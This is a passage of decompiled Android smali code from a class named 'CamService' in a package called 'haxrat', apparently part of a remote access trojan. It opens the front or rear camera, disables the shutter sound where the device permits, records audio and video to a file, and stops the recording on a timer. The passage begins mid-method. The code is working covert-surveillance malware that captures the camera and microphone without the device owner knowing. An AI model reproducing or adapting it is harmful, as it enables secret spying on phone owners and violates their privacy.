    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setCamera(Landroid/hardware/Camera;)V

    .line 124
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x1

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 125
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x1

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setVideoSource(I)V

    .line 126
    const-string v6, "Suprem"

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "Quality isCameraQualityHigh ="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move-object v8, v0

    iget-boolean v8, v8, Lcom/hax4us/haxrat/CamService;->isCameraQualityHigh:Z

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Z)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 127
    move-object v6, v0

    iget-boolean v6, v6, Lcom/hax4us/haxrat/CamService;->isCameraQualityHigh:Z

    if-nez v6, :cond_9

    .line 130
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x0

    invoke-static {v7}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V

    .line 135
    :goto_1
    move-object v6, v0

    sget v7, Lcom/hax4us/haxrat/CamService;->typeForVideo:I

    move-object v8, v0

    iget v8, v8, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    invoke-static {v7, v8}, Lcom/util/extras/Utils;->getFilePath(II)Ljava/io/File;

    move-result-object v7

    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->file:Ljava/io/File;

    .line 136
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    move-object v7, v0

    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->file:Ljava/io/File;

    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 147
    :cond_3
    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x1

    if-eq v6, v7, :cond_4

    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x2

    if-eq v6, v7, :cond_4

    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x3

    if-ne v6, v7, :cond_5

    .line 149
    :cond_4
    move-object v6, v0

    :try_start_0
    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 151
    :goto_2
    const-string v6, "Suprem"

    const-string v7, "Recording started "

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 153
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->start()V

    .line 154
    move-object v6, v0

    new-instance v7, Lcom/hax4us/haxrat/CamService$100000000;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    move-object v9, v0

    invoke-direct {v8, v9}, Lcom/hax4us/haxrat/CamService$100000000;-><init>(Lcom/hax4us/haxrat/CamService;)V

    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->stopRecordingTimer:Ljava/util/TimerTask;

    .line 164
    new-instance v6, Ljava/util/Timer;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    invoke-direct {v7}, Ljava/util/Timer;-><init>()V

    move-object v7, v0

    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->stopRecordingTimer:Ljava/util/TimerTask;

    move-object v8, v0

    iget v8, v8, Lcom/hax4us/haxrat/CamService;->secs:I

    const/16 v9, 0x3e8

    mul-int/lit16 v8, v8, 0x3e8

    int-to-long v8, v8

    invoke-virtual {v6, v7, v8, v9}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :cond_5
    return-void

    .line 102
    :cond_6
    sget-object v6, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "camera n "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move v8, v3

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 103
    new-instance v6, Landroid/hardware/Camera$CameraInfo;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    invoke-direct {v7}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    move-object v4, v6

    .line 104
    move v6, v3

    move-object v7, v4

    invoke-static {v6, v7}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 106
    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x1

    if-ne v6, v7, :cond_8

    move-object v6, v4

    iget v6, v6, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v7, 0x0

    if-ne v6, v7, :cond_8

    .line 107
    const-string v6, "Suprem"

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "a ="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move-object v8, v0

    iget v8, v8, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 108
    move-object v6, v0

    const/4 v7, 0x0

    invoke-static {v7}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v7

    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    .line 109
    sget v6, Lcom/hax4us/haxrat/CamService;->currentapiVersion:I

    const/16 v7, 0x11

    if-lt v6, v7, :cond_7

    move-object v6, v4

    iget-boolean v6, v6, Landroid/hardware/Camera$CameraInfo;->canDisableShutterSound:Z

    if-eqz v6, :cond_7

    .line 110
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    const/4 v7, 0x0

    invoke-virtual {v6, v7}, Landroid/hardware/Camera;->enableShutterSound(Z)Z

    move-result v6

    .line 101
    :cond_7
    :goto_3
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_0

    .line 112
    :cond_8
    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x2

    if-ne v6, v7, :cond_7

    move-object v6, v4

    iget v6, v6, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v7, 0x1

    if-ne v6, v7, :cond_7

    .line 113
    const-string v6, "Suprem"

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "a ="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move-object v8, v0

    iget v8, v8, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 114
    move-object v6, v0

    const/4 v7, 0x1

    invoke-static {v7}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v7

    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    .line 115
    sget v6, Lcom/hax4us/haxrat/CamService;->currentapiVersion:I

    const/16 v7, 0x11

    if-lt v6, v7, :cond_7

    move-object v6, v4

    iget-boolean v6, v6, Landroid/hardware/Camera$CameraInfo;->canDisableShutterSound:Z

    if-eqz v6, :cond_7

    .line 116
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    const/4 v7, 0x0

    invoke-virtual {v6, v7}, Landroid/hardware/Camera;->enableShutterSound(Z)Z

    move-result v6

    goto :goto_3

    .line 128
    :cond_9
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x1

    invoke-static {v7}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V

    goto/16 :goto_1

    .line 149
    :catch_0
    move-exception v6

    move-object v3, v6

    goto/16 :goto_2
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/SurfaceHolder;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method
